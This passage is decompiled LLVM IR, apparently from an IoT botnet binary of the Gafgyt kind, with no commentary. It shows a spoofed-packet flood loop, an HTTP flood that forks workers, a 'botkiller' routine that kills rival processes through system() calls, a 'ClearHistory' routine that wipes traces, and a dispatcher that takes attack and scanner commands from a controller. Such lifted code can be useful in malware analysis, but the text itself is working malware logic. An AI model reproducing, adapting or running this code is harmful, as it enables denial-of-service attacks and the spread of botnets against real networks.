  %v2_10009acc = inttoptr i32 %v1_10009acc to i16*
  %v3_10009acc = load i16, i16* %v2_10009acc, align 2
  %v4_10009acc = zext i16 %v3_10009acc to i32
  %v5_10009adc = inttoptr i32 %v1_100097b4 to i16*
  %v6_10009adc = call i32 @csum(i16* %v5_10009adc, i32 %v4_10009acc, i32 %v1_100097b4, i32 6, i32 %v1_100097fc)
  %sext3 = mul i32 %v6_10009adc, 65536
  %v1_10009ae0 = sdiv i32 %sext3, 65536
  %v1_10009ae8 = trunc i32 %v1_10009ae0 to i16
  %v3_10009ae8 = or i32 %v1_100097b4, 10
  %v4_10009ae8 = inttoptr i32 %v3_10009ae8 to i16*
  store i16 %v1_10009ae8, i16* %v4_10009ae8, align 2
  store i32 268475124, i32* @lr, align 4
  %v1_10009af0 = call i32 @__GI_time(i32 0)
  %v2_10009afc = add i32 %v1_10009af0, %arg3
  %v2_10009b50 = or i32 %v1_100097b4, 12
  %v3_10009b50 = inttoptr i32 %v2_10009b50 to i32*
  %v3_10009b64 = or i32 %v1_100097b4, 4
  %v4_10009b64 = inttoptr i32 %v3_10009b64 to i16*
  br label %dec_label_pc_10009b10

dec_label_pc_10009b10:                            ; preds = %dec_label_pc_10009b10.backedge, %dec_label_pc_10009a9c
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_10009a9c ], [ %storemerge22, %dec_label_pc_10009b10.backedge ]
  store i32 268475188, i32* @lr, align 4
  %v7_10009b30 = call i32 @__libc_sendto(i32 %v3_100096c0, i32 %v1_100097b4, i32 %v1_1000977c, i32 0, i32 %v2_10009678, i32 16, i32 %v2_10009678)
  %v1_10009b38 = call i32 @GetRandomIP(i32 %storemerge9)
  store i32 %v1_10009b38, i32* @r3, align 4
  %v1_10009b44 = call i32 @htonl(i32 %v1_10009b38)
  store i32 %v1_10009b44, i32* %v3_10009b50, align 4
  %v0_10009b54 = call i32 @rand_cmwc()
  %v1_10009b64 = trunc i32 %v0_10009b54 to i16
  store i16 %v1_10009b64, i16* %v4_10009b64, align 4
  %v0_10009b68 = call i32 @rand_cmwc()
  store i32 %v0_10009b68, i32* %v3_10009838, align 8
  %v0_10009b78 = call i32 @rand_cmwc()
  %v1_10009b88 = trunc i32 %v0_10009b78 to i16
  store i16 %v1_10009b88, i16* %v5_100097d8, align 4
  store i16 0, i16* %v4_10009a54, align 4
  store i32 268475300, i32* @lr, align 4
  %v4_10009ba0 = call i32 @tcpcsum(i32 %v1_100097b4, i32* %v3_10009ab0, i32 %v1_100097d4)
  %v1_10009bac = trunc i32 %v4_10009ba0 to i16
  store i16 %v1_10009bac, i16* %v4_10009a54, align 4
  %v3_10009bbc = load i16, i16* %v2_10009acc, align 2
  %v4_10009bbc = zext i16 %v3_10009bbc to i32
  %v6_10009bcc = call i32 @csum(i16* %v5_10009adc, i32 %v4_10009bbc, i32 %v1_100097b4, i32 0, i32 %v2_10009678)
  %v1_10009bd8 = trunc i32 %v6_10009bcc to i16
  store i16 %v1_10009bd8, i16* %v4_10009ae8, align 2
  %v4_10009be4 = icmp eq i32 %stack_var_-44.0, %arg7
  br i1 %v4_10009be4, label %dec_label_pc_10009bec, label %dec_label_pc_10009c10

dec_label_pc_10009bec:                            ; preds = %dec_label_pc_10009b10
  store i32 268475380, i32* @lr, align 4
  %v1_10009bf0 = call i32 @__GI_time(i32 0)
  %v3_10009bfc = icmp sgt i32 %v1_10009bf0, %v2_10009afc
  br i1 %v3_10009bfc, label %dec_label_pc_10009c20, label %dec_label_pc_10009b10.backedge

dec_label_pc_10009b10.backedge:                   ; preds = %dec_label_pc_10009bec, %dec_label_pc_10009c10
  %storemerge22 = phi i32 [ %v1_10009c14, %dec_label_pc_10009c10 ], [ 0, %dec_label_pc_10009bec ]
  br label %dec_label_pc_10009b10

dec_label_pc_10009c10:                            ; preds = %dec_label_pc_10009b10
  %v1_10009c14 = add i32 %stack_var_-44.0, 1
  br label %dec_label_pc_10009b10.backedge

dec_label_pc_10009c20:                            ; preds = %dec_label_pc_10009bec, %dec_label_pc_10009678, %dec_label_pc_10009728, %dec_label_pc_100096d8
  %v0_10009c48 = phi i32 [ %v4_10009688, %dec_label_pc_10009678 ], [ %v4_10009740, %dec_label_pc_10009728 ], [ %v4_100096f0, %dec_label_pc_100096d8 ], [ %v1_10009bf0, %dec_label_pc_10009bec ]
  ret i32 %v0_10009c48

; uselistorder directives
  uselistorder i32 %v1_10009a88, { 1, 0 }
  uselistorder i32 %v3_10009a20, { 1, 0 }
  uselistorder i32 %storemerge1319, { 1, 0 }
  uselistorder i32* %v2_1000984c, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i32 %v1_100097fc, { 1, 0 }
  uselistorder i32 %v1_100097d4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_100097b4, { 14, 15, 4, 2, 3, 5, 16, 1, 6, 17, 7, 8, 9, 10, 0, 11, 12, 13, 18, 19 }
  uselistorder i32 %v2_10009678, { 1, 3, 2, 0 }
  uselistorder i32 %v1_10009664, { 1, 0 }
  uselistorder i32* %stack_var_-92, { 1, 0 }
  uselistorder i32* %stack_var_-88, { 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 1, 0 }
  uselistorder i32 (i32)* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 -16, { 1, 0, 3, 2, 5, 4, 6 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10009c20, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_10009b10.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10009a9c, { 1, 0 }
  uselistorder label %dec_label_pc_10009a14, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_100098f0, { 1, 0 }
  uselistorder label %dec_label_pc_10009778, { 1, 0 }
  uselistorder label %dec_label_pc_10009678, { 1, 0 }
}

define i32 @botkiller(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-100 = alloca i8*, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10009c4c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10009c4c, i32* %stack_var_-112, align 4
  %v5_10009c4c = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v5_10009c4c, i32* @r31, align 4
  %v2_10009c6c = ptrtoint i8** %stack_var_-100 to i32
  %v2_10009cb4 = bitcast i8** %stack_var_-100 to i8*
  br label %dec_label_pc_10009c60

dec_label_pc_10009c60:                            ; preds = %dec_label_pc_10009d50, %entry
  br label %dec_label_pc_10009c6c

dec_label_pc_10009c6c:                            ; preds = %dec_label_pc_10009c60, %dec_label_pc_10009c6c
  %storemerge34 = phi i32 [ 0, %dec_label_pc_10009c60 ], [ %v1_10009d3c, %dec_label_pc_10009c6c ]
  store i8* inttoptr (i32 1886087532 to i8*), i8** %stack_var_-100, align 4
  %v1_10009c9c = mul i32 %storemerge34, 4
  %v2_10009ca0 = add i32 %v1_10009c9c, ptrtoint ([86 x i8*]* @global_var_10028024.458 to i32)
  %v1_10009ca4 = inttoptr i32 %v2_10009ca0 to i32*
  %v2_10009ca4 = load i32, i32* %v1_10009ca4, align 4
  store i32 %v2_10009ca4, i32* @r4, align 4
  %v3_10009cb4 = call i32 @strcat(i8* %v2_10009cb4, i32 %v2_10009ca4)
  store i32 268475588, i32* @lr, align 4
  %v1_10009cc0 = call i32 @__libc_system(i32 %v2_10009c6c)
  store i8* inttoptr (i32 1886087532 to i8*), i8** %stack_var_-100, align 4
  %v2_10009d04 = load i32, i32* %v1_10009ca4, align 4
  store i32 %v2_10009d04, i32* @r4, align 4
  %v3_10009d14 = call i32 @strcat(i8* %v2_10009cb4, i32 %v2_10009d04)
  store i32 ptrtoint (i32* @global_var_10015fb0.463 to i32), i32* @r4, align 4
  %v3_10009d28 = call i32 @strcat(i8* %v2_10009cb4, i32 ptrtoint (i32* @global_var_10015fb0.463 to i32))
  store i32 268475704, i32* @lr, align 4
  %v1_10009d34 = call i32 @__libc_system(i32 %v2_10009c6c)
  %v1_10009d3c = add nuw nsw i32 %storemerge34, 1
  %tmp13 = icmp slt i32 %v1_10009d3c, 9
  br i1 %tmp13, label %dec_label_pc_10009c6c, label %dec_label_pc_10009d50

dec_label_pc_10009d50:                            ; preds = %dec_label_pc_10009c6c
  store i32 268475736, i32* @lr, align 4
  %v1_10009d54 = call i32 @sleep(i32 5)
  br label %dec_label_pc_10009c60

; uselistorder directives
  uselistorder i32 %storemerge34, { 1, 0 }
  uselistorder i32* %stack_var_-112, { 1, 0 }
  uselistorder i8** %stack_var_-100, { 3, 2, 0, 1 }
  uselistorder [3 x i8]* @global_var_100148f0.19, { 1, 0 }
  uselistorder label %dec_label_pc_10009c6c, { 1, 0 }
}

define i32 @ClearHistory() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10009d5c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10009d5c, i32* %stack_var_-16, align 4
  %v5_10009d5c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v5_10009d5c, i32* @r31, align 4
  store i32 268475772, i32* @lr, align 4
  %v2_10009d78 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_10015fb4.464 to i32))
  store i32 268475784, i32* @lr, align 4
  %v2_10009d84 = call i32 @__libc_system(i32 ptrtoint ([30 x i8]* @global_var_10015fcc.465 to i32))
  store i32 268475796, i32* @lr, align 4
  %v2_10009d90 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_10015fec.466 to i32))
  ret i32 %v2_10009d90

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32 (i32)* @__libc_system, { 4, 3, 2, 1, 0 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-580 = alloca i32, align 4
  %stack_var_-632 = alloca i32, align 4
  store i32 268475976, i32* @lr, align 4
  %v1_10009e44 = call i32 @__GI_time(i32 0)
  %v2_10009e50 = add i32 %v1_10009e44, %arg5
  store i32 268475996, i32* @lr, align 4
  %v0_10009e58 = call i32 @random()
  %v2_10009e90 = ptrtoint i32* %stack_var_-632 to i32
  store i32 268476068, i32* @lr, align 4
  %v0_10009ea0 = call i32 @random()
  %v2_10009ec0 = srem i32 %v0_10009ea0, 7
  %v1_10009edc = mul nsw i32 %v2_10009ec0, 4
  %v2_10009ee4 = add i32 %v2_10009e90, 12
  %v1_10009ee8 = add i32 %v2_10009ee4, %v1_10009edc
  %v1_10009eec = inttoptr i32 %v1_10009ee8 to i32*
  %v2_10009eec = load i32, i32* %v1_10009eec, align 4
  %v2_10009ef0 = ptrtoint i32* %stack_var_-580 to i32
  store i32 %v2_10009ef0, i32* @r3, align 4
  %v0_10009f08 = load i32, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10009f18.488 to i32), i32* @lr, align 4
  %v9_10009f14 = call i32 @sprintf(i32 %v2_10009ef0, i32 ptrtoint ([62 x i8]* @global_var_10016220.487 to i32), i32 %arg2, i32 %arg4, i32 %v0_10009f08, i32 %v2_10009eec, i32 268500992, i32 %v2_10009ec0)
  %v2_10009fc46 = icmp sgt i32 %arg6, 0
  br i1 %v2_10009fc46, label %dec_label_pc_10009f24.lr.ph, label %dec_label_pc_10009fcc

dec_label_pc_10009f24.lr.ph:                      ; preds = %entry
  br label %dec_label_pc_10009f24

dec_label_pc_10009f24:                            ; preds = %dec_label_pc_10009f24.lr.ph, %dec_label_pc_10009fb0
  %storemerge19 = phi i32 [ 0, %dec_label_pc_10009f24.lr.ph ], [ %v1_10009fb4, %dec_label_pc_10009fb0 ]
  store i32 268476200, i32* @lr, align 4
  %v0_10009f24 = call i32 @__libc_fork()
  %v3_10009f2c = icmp eq i32 %v0_10009f24, 0
  br i1 %v3_10009f2c, label %dec_label_pc_10009fb0, label %dec_label_pc_10009f90.preheader

dec_label_pc_10009f90.preheader:                  ; preds = %dec_label_pc_10009f24
  store i32 268476312, i32* @lr, align 4
  %v1_10009f942 = call i32 @__GI_time(i32 0)
  %v2_10009fa03 = icmp slt i32 %v1_10009f942, %v2_10009e50
  br i1 %v2_10009fa03, label %dec_label_pc_10009f38, label %dec_label_pc_10009fa8

dec_label_pc_10009f38:                            ; preds = %dec_label_pc_10009f90.preheader, %dec_label_pc_10009f90.backedge
  %v3_10009f4c = call i32 @socket_connect(i32 %arg1, i16 %arg3)
  store i32 %v3_10009f4c, i32* %stack_var_-632, align 4
  %v3_10009f5c = icmp eq i32 %v3_10009f4c, 0
  br i1 %v3_10009f5c, label %dec_label_pc_10009f90.backedge, label %dec_label_pc_10009f64

dec_label_pc_10009f64:                            ; preds = %dec_label_pc_10009f38
  store i32 %v2_10009ef0, i32* @r3, align 4
  %v0_10009f6c = call i32 @__GI_strlen()
  %v3_10009f78 = load i32, i32* %stack_var_-632, align 4
  store i32 268476296, i32* @lr, align 4
  %v2_10009f84 = call i32 @__libc_write(i32 %v3_10009f78, i32 %v2_10009ef0)
  %v3_10009f88 = load i32, i32* %stack_var_-632, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009f90.489 to i32), i32* @lr, align 4
  %v1_10009f8c = call i32 @__libc_close(i32 %v3_10009f88)
  br label %dec_label_pc_10009f90.backedge

dec_label_pc_10009f90.backedge:                   ; preds = %dec_label_pc_10009f64, %dec_label_pc_10009f38
  store i32 268476312, i32* @lr, align 4
  %v1_10009f94 = call i32 @__GI_time(i32 0)
  %v2_10009fa0 = icmp slt i32 %v1_10009f94, %v2_10009e50
  br i1 %v2_10009fa0, label %dec_label_pc_10009f38, label %dec_label_pc_10009fa8

dec_label_pc_10009fa8:                            ; preds = %dec_label_pc_10009f90.backedge, %dec_label_pc_10009f90.preheader
  %v1_10009fac = call i32 @__GI__exit(i32 1)
  br label %dec_label_pc_10009fb0

dec_label_pc_10009fb0:                            ; preds = %dec_label_pc_10009f24, %dec_label_pc_10009fa8
  %v0_10009fe411 = phi i32 [ 0, %dec_label_pc_10009f24 ], [ %v1_10009fac, %dec_label_pc_10009fa8 ]
  %v1_10009fb4 = add nuw nsw i32 %storemerge19, 1
  %v2_10009fc4 = icmp slt i32 %v1_10009fb4, %arg6
  br i1 %v2_10009fc4, label %dec_label_pc_10009f24, label %dec_label_pc_10009fcc

dec_label_pc_10009fcc:                            ; preds = %dec_label_pc_10009fb0, %entry
  %v0_10009fe4 = phi i32 [ %v9_10009f14, %entry ], [ %v0_10009fe411, %dec_label_pc_10009fb0 ]
  ret i32 %v0_10009fe4

; uselistorder directives
  uselistorder i32 %v2_10009ef0, { 1, 2, 0, 3 }
  uselistorder i32 %v2_10009e50, { 1, 0 }
  uselistorder i32 268476312, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_10009fb0, { 1, 0 }
  uselistorder label %dec_label_pc_10009f38, { 1, 0 }
  uselistorder label %dec_label_pc_10009f24, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-80 = alloca i32, align 4
  %v2_1000a01c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_100150d4.30 to i32), i32* @r4, align 4
  %v3_1000a02c = inttoptr i32 %v2_1000a01c to i8*
  %v4_1000a02c = call i32 @__GI_strcoll(i8* %v3_1000a02c, i32 ptrtoint ([5 x i8]* @global_var_100150d4.30 to i32))
  %v3_1000a034 = icmp eq i32 %v4_1000a02c, 0
  br i1 %v3_1000a034, label %dec_label_pc_1000a03c, label %dec_label_pc_1000a05c

dec_label_pc_1000a03c:                            ; preds = %entry
  %v3_1000a040 = load i32, i32* @global_var_100285b0.29, align 4
  store i32 ptrtoint (i32* @global_var_1000a058.491 to i32), i32* @lr, align 4
  %v4_1000a054 = call i32 @sockprintf(i32 %v3_1000a040, i32 ptrtoint ([6 x i8]* @global_var_10016260.490 to i32), i32 268500992)
  br label %dec_label_pc_1000aea0

dec_label_pc_1000a05c:                            ; preds = %entry
  %v2_1000a060 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_10016268.492 to i32), i32* @r4, align 4
  %v3_1000a070 = inttoptr i32 %v2_1000a060 to i8*
  %v4_1000a070 = call i32 @__GI_strcoll(i8* %v3_1000a070, i32 ptrtoint ([6 x i8]* @global_var_10016268.492 to i32))
  %v3_1000a078 = icmp eq i32 %v4_1000a070, 0
  br i1 %v3_1000a078, label %dec_label_pc_1000a080, label %dec_label_pc_1000a0ac

dec_label_pc_1000a080:                            ; preds = %dec_label_pc_1000a05c
  %v3_1000a084 = load i32, i32* @global_var_100285b0.29, align 4
  store i32 268476556, i32* @lr, align 4
  %v1_1000a088 = call i32 @getdtablesize(i32 268632064)
  store i32 ptrtoint (i32* @global_var_1000a0a8.494 to i32), i32* @lr, align 4
  %v5_1000a0a4 = call i32 @sockprintf(i32 %v3_1000a084, i32 ptrtoint ([3 x i8]* @global_var_10016270.493 to i32), i32 %v1_1000a088)
  br label %dec_label_pc_1000aea0

dec_label_pc_1000a0ac:                            ; preds = %dec_label_pc_1000a05c
  %v2_1000a0b0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_10016274.495 to i32), i32* @r4, align 4
  %v3_1000a0c0 = inttoptr i32 %v2_1000a0b0 to i8*
  %v4_1000a0c0 = call i32 @__GI_strcoll(i8* %v3_1000a0c0, i32 ptrtoint ([8 x i8]* @global_var_10016274.495 to i32))
  %v3_1000a0c8 = icmp eq i32 %v4_1000a0c0, 0
  br i1 %v3_1000a0c8, label %dec_label_pc_1000a0d0, label %dec_label_pc_1000a214

dec_label_pc_1000a0d0:                            ; preds = %dec_label_pc_1000a0ac
  %v1_1000a0d4 = add i32 %tmp, 4
  %v1_1000a0d8 = inttoptr i32 %v1_1000a0d4 to i32*
  %v2_1000a0d8 = load i32, i32* %v1_1000a0d8, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1001627c.496 to i32), i32* @r4, align 4
  %v3_1000a0e8 = inttoptr i32 %v2_1000a0d8 to i8*
  %v4_1000a0e8 = call i32 @__GI_strcoll(i8* %v3_1000a0e8, i32 ptrtoint ([4 x i8]* @global_var_1001627c.496 to i32))
  %v3_1000a0f0 = icmp eq i32 %v4_1000a0e8, 0
  br i1 %v3_1000a0f0, label %dec_label_pc_1000a0f8, label %dec_label_pc_1000a144

dec_label_pc_1000a0f8:                            ; preds = %dec_label_pc_1000a0d0
  %v3_1000a0fc = load i32, i32* @global_var_100285e0.497, align 4
  %v3_1000a100 = icmp eq i32 %v3_1000a0fc, 0
  br i1 %v3_1000a100, label %dec_label_pc_1000aea0, label %dec_label_pc_1000a108

dec_label_pc_1000a108:                            ; preds = %dec_label_pc_1000a0f8
  store i32 268476700, i32* @lr, align 4
  %v2_1000a118 = call i32 @kill(i32 %v3_1000a0fc, i32 9)
  %v3_1000a120 = load i32, i32* @global_var_100285b0.29, align 4
  store i32 268476728, i32* @lr, align 4
  %v4_1000a134 = call i32 @sockprintf(i32 %v3_1000a120, i32 ptrtoint ([17 x i8]* @global_var_10016280.498 to i32), i32 268500992)
  store i32 0, i32* @global_var_100285e0.497, align 4
  br label %dec_label_pc_1000a144

dec_label_pc_1000a144:                            ; preds = %dec_label_pc_1000a0d0, %dec_label_pc_1000a108
  %v2_1000a14c = load i32, i32* %v1_1000a0d8, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10016294.499 to i32), i32* @r4, align 4
  %v3_1000a15c = inttoptr i32 %v2_1000a14c to i8*
  %v4_1000a15c = call i32 @__GI_strcoll(i8* %v3_1000a15c, i32 ptrtoint ([3 x i8]* @global_var_10016294.499 to i32))
  %v3_1000a164 = icmp eq i32 %v4_1000a15c, 0
  br i1 %v3_1000a164, label %dec_label_pc_1000a16c, label %dec_label_pc_1000a214

dec_label_pc_1000a16c:                            ; preds = %dec_label_pc_1000a144
  %v3_1000a170 = load i32, i32* @global_var_100285e0.497, align 4
  %v3_1000a174 = icmp eq i32 %v3_1000a170, 0
  br i1 %v3_1000a174, label %dec_label_pc_1000a17c, label %dec_label_pc_1000aea0

dec_label_pc_1000a17c:                            ; preds = %dec_label_pc_1000a16c
  store i32 268476800, i32* @lr, align 4
  %v0_1000a17c = call i32 @__libc_fork()
  %v3_1000a19c = icmp eq i32 %v0_1000a17c, 0
  br i1 %v3_1000a19c, label %dec_label_pc_1000a1b4, label %dec_label_pc_1000a1a4

dec_label_pc_1000a1a4:                            ; preds = %dec_label_pc_1000a17c
  store i32 %v0_1000a17c, i32* @global_var_100285e0.497, align 4
  br label %dec_label_pc_1000aea0

dec_label_pc_1000a1b4:                            ; preds = %dec_label_pc_1000a17c
  %v3_1000a1d0 = load i32, i32* @global_var_100285d8.249, align 4
  store i32 %v3_1000a1d0, i32* %stack_var_-80, align 4
  store i32 268476900, i32* @lr, align 4
  %v3_1000a1e0 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-80, i32 268632064)
  %v0_1000a1e8 = load i32, i32* @r29, align 4
  store i32 268476928, i32* @lr, align 4
  %v5_1000a1fc = call i32 @sockprintf(i32 %v0_1000a1e8, i32 ptrtoint ([26 x i8]* @global_var_10016298.500 to i32), i32 %v3_1000a1e0)
  %v2_1000a208 = call i32 @StartTheLelz(i32 10, i32 1000)
  %v1_1000a210 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000a214

dec_label_pc_1000a214:                            ; preds = %dec_label_pc_1000a144, %dec_label_pc_1000a0ac, %dec_label_pc_1000a1b4
  %v2_1000a218 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_100162b4.502 to i32), i32* @r4, align 4
  %v3_1000a228 = inttoptr i32 %v2_1000a218 to i8*
  %v4_1000a228 = call i32 @__GI_strcoll(i8* %v3_1000a228, i32 ptrtoint ([8 x i8]* @global_var_100162b4.502 to i32))
  %v3_1000a230 = icmp eq i32 %v4_1000a228, 0
  br i1 %v3_1000a230, label %dec_label_pc_1000a238, label %dec_label_pc_1000a290

dec_label_pc_1000a238:                            ; preds = %dec_label_pc_1000a214
  store i32 268476988, i32* @lr, align 4
  %v0_1000a238 = call i32 @listFork()
  %v3_1000a240 = icmp eq i32 %v0_1000a238, 0
  br i1 %v3_1000a240, label %dec_label_pc_1000a248, label %dec_label_pc_1000a290

dec_label_pc_1000a248:                            ; preds = %dec_label_pc_1000a238
  %v3_1000a254 = load i32, i32* @global_var_100285d8.249, align 4
  store i32 %v3_1000a254, i32* %stack_var_-80, align 4
  store i32 268477032, i32* @lr, align 4
  %v3_1000a264 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-80, i32 268632064)
  %v0_1000a26c = load i32, i32* @r29, align 4
  store i32 268477060, i32* @lr, align 4
  %v5_1000a280 = call i32 @sockprintf(i32 %v0_1000a26c, i32 ptrtoint ([29 x i8]* @global_var_100162bc.503 to i32), i32 %v3_1000a264)
  %v1_1000a284 = call i32 @botkiller(i32 %v5_1000a280)
  %v1_1000a28c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000a290

dec_label_pc_1000a290:                            ; preds = %dec_label_pc_1000a238, %dec_label_pc_1000a214, %dec_label_pc_1000a248
  %v2_1000a294 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_100162dc.505 to i32), i32* @r4, align 4
  %v3_1000a2a4 = inttoptr i32 %v2_1000a294 to i8*
  %v4_1000a2a4 = call i32 @__GI_strcoll(i8* %v3_1000a2a4, i32 ptrtoint ([12 x i8]* @global_var_100162dc.505 to i32))
  %v3_1000a2ac = icmp eq i32 %v4_1000a2a4, 0
  br i1 %v3_1000a2ac, label %dec_label_pc_1000a2b4, label %dec_label_pc_1000a2f4

dec_label_pc_1000a2b4:                            ; preds = %dec_label_pc_1000a290
  %v3_1000a2c0 = load i32, i32* @global_var_100285d8.249, align 4
  store i32 %v3_1000a2c0, i32* %stack_var_-80, align 4
  store i32 268477140, i32* @lr, align 4
  %v3_1000a2d0 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-80, i32 268632064)
  %v0_1000a2d8 = load i32, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_1000a2f0.507 to i32), i32* @lr, align 4
  %v5_1000a2ec = call i32 @sockprintf(i32 %v0_1000a2d8, i32 ptrtoint ([17 x i8]* @global_var_100162e8.506 to i32), i32 %v3_1000a2d0)
  br label %dec_label_pc_1000aea0

dec_label_pc_1000a2f4:                            ; preds = %dec_label_pc_1000a290
  %v2_1000a2f8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_100162fc.508 to i32), i32* @r4, align 4
  %v3_1000a308 = inttoptr i32 %v2_1000a2f8 to i8*
  %v4_1000a308 = call i32 @__GI_strcoll(i8* %v3_1000a308, i32 ptrtoint ([4 x i8]* @global_var_100162fc.508 to i32))
  %v3_1000a310 = icmp eq i32 %v4_1000a308, 0
  br i1 %v3_1000a310, label %dec_label_pc_1000a318, label %dec_label_pc_1000a67c

dec_label_pc_1000a318:                            ; preds = %dec_label_pc_1000a2f4
  %tmp86 = icmp slt i32 %arg1, 6
  br i1 %tmp86, label %dec_label_pc_1000a44c, label %dec_label_pc_1000a324

dec_label_pc_1000a324:                            ; preds = %dec_label_pc_1000a318
  %v1_1000a328 = add i32 %tmp, 12
  %v1_1000a32c = inttoptr i32 %v1_1000a328 to i32*
  %v2_1000a32c = load i32, i32* %v1_1000a32c, align 4
  store i32 268477240, i32* @lr, align 4
  %v2_1000a334 = call i32 @atol(i32 %v2_1000a32c, i32 %v1_1000a328)
  %v4_1000a340 = icmp eq i32 %v2_1000a334, -1
  br i1 %v4_1000a340, label %dec_label_pc_1000a44c, label %dec_label_pc_1000a348

dec_label_pc_1000a348:                            ; preds = %dec_label_pc_1000a324
  %v1_1000a34c = add i32 %tmp, 8
  %v1_1000a350 = inttoptr i32 %v1_1000a34c to i32*
  %v2_1000a350 = load i32, i32* %v1_1000a350, align 4
  store i32 268477276, i32* @lr, align 4
  %v2_1000a358 = call i32 @atol(i32 %v2_1000a350, i32 %v1_1000a34c)
  %v4_1000a364 = icmp eq i32 %v2_1000a358, -1
  br i1 %v4_1000a364, label %dec_label_pc_1000a44c, label %dec_label_pc_1000a36c

dec_label_pc_1000a36c:                            ; preds = %dec_label_pc_1000a348
  %v1_1000a370 = add i32 %tmp, 16
  %v1_1000a374 = inttoptr i32 %v1_1000a370 to i32*
  %v2_1000a374 = load i32, i32* %v1_1000a374, align 4
  store i32 268477312, i32* @lr, align 4
  %v2_1000a37c = call i32 @atol(i32 %v2_1000a374, i32 %v1_1000a370)
  %v4_1000a388 = icmp eq i32 %v2_1000a37c, -1
  br i1 %v4_1000a388, label %dec_label_pc_1000a44c, label %dec_label_pc_1000a390

dec_label_pc_1000a390:                            ; preds = %dec_label_pc_1000a36c
  %v1_1000a394 = add i32 %tmp, 20
  %v1_1000a398 = inttoptr i32 %v1_1000a394 to i32*
  %v2_1000a398 = load i32, i32* %v1_1000a398, align 4
  store i32 268477348, i32* @lr, align 4
  %v2_1000a3a0 = call i32 @atol(i32 %v2_1000a398, i32 %v1_1000a394)
  %v4_1000a3ac = icmp eq i32 %v2_1000a3a0, -1
  br i1 %v4_1000a3ac, label %dec_label_pc_1000a44c, label %dec_label_pc_1000a3b4

dec_label_pc_1000a3b4:                            ; preds = %dec_label_pc_1000a390
  %v2_1000a3bc = load i32, i32* %v1_1000a398, align 4
  store i32 268477384, i32* @lr, align 4
  %v2_1000a3c4 = call i32 @atol(i32 %v2_1000a3bc, i32 %v1_1000a394)
  %v3_1000a3d0 = icmp sgt i32 %v2_1000a3c4, 65536
  br i1 %v3_1000a3d0, label %dec_label_pc_1000a44c, label %dec_label_pc_1000a3d8

dec_label_pc_1000a3d8:                            ; preds = %dec_label_pc_1000a3b4
  %v2_1000a3e0 = load i32, i32* %v1_1000a398, align 4
  store i32 268477420, i32* @lr, align 4
  %v2_1000a3e8 = call i32 @atol(i32 %v2_1000a3e0, i32 %v1_1000a394)
  %v3_1000a3f8 = icmp sgt i32 %v2_1000a3e8, 65500
  br i1 %v3_1000a3f8, label %dec_label_pc_1000a44c, label %dec_label_pc_1000a400

dec_label_pc_1000a400:                            ; preds = %dec_label_pc_1000a3d8
  %v2_1000a408 = load i32, i32* %v1_1000a374, align 4
  store i32 268477460, i32* @lr, align 4
  %v2_1000a410 = call i32 @atol(i32 %v2_1000a408, i32 %v1_1000a370)
  %v2_1000a418 = icmp sgt i32 %v2_1000a410, 32
  br i1 %v2_1000a418, label %dec_label_pc_1000a44c, label %dec_label_pc_1000a420

dec_label_pc_1000a420:                            ; preds = %dec_label_pc_1000a400
  %v1_1000a424 = icmp slt i32 %arg1, 7
  %v3_1000a424 = icmp eq i32 %arg1, 7
  br i1 %v3_1000a424, label %dec_label_pc_1000a42c, label %dec_label_pc_1000a46c

dec_label_pc_1000a42c:                            ; preds = %dec_label_pc_1000a420
  %v1_1000a430 = add i32 %tmp, 24
  %v1_1000a434 = inttoptr i32 %v1_1000a430 to i32*
